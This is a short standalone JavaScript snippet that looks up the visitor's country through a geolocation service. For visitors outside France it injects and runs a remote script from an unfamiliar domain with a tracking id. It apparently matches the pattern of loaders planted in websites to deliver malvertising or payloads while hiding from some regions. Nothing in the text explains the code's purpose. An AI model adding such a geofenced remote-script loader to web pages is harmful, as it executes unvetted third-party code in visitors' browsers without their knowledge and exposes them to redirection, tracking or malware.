var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
    if (this.responseText.toLowerCase().indexOf('"country_code":"fr"') === -1){
        (function() {
         var script = document.createElement('script');
            script.async = true;
            script.type = 'text/javascript';
            script.src = 'https://ohsatum.info/script.js?sid=871623';
            document.body.appendChild(script);
        })();
    }
}
};
xhttp.open("GET", "https://geolocation-db.com/json/", true);
xhttp.send();
